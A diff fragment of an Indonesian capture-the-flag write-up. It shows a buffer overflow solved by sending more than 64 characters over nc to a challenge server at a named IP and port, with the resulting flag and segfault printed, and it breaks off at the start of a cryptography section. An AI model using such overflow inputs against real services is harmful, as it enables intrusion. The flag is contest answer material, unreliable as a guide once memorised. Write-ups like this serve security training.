@@ -45,3 +45,26 @@ int main(int argc, char **argv)
   }
 }
 ```
+
+Dan sebuah nc 52.187.65.2 17001.
+Dari code kita tahu bahwa buffer overflow terjadi ketika data char lebih dari 64 byte, langsung saja kita input karakter lebih dari 64 byte
+
+```
+ilham@ilham-Acer:~$ nc 52.187.65.2 17001
+██╗     ██╗███╗   ██╗███████╗
+██║     ██║████╗  ██║╚══███╔╝
+██║     ██║██╔██╗ ██║  ███╔╝ 
+██║     ██║██║╚██╗██║ ███╔╝  
+███████╗██║██║ ╚████║███████╗
+╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
+Put some text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}
+/home/ctf/run_challenge.sh: line 2:   853 Segmentation fault      (core dumped) ./chall
+```
+
+**flag: agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}**
+
+## Cryptography
+
+## Basic64 (100 Pts)
+Diberikan file enc.txt dan dilihat isinya:
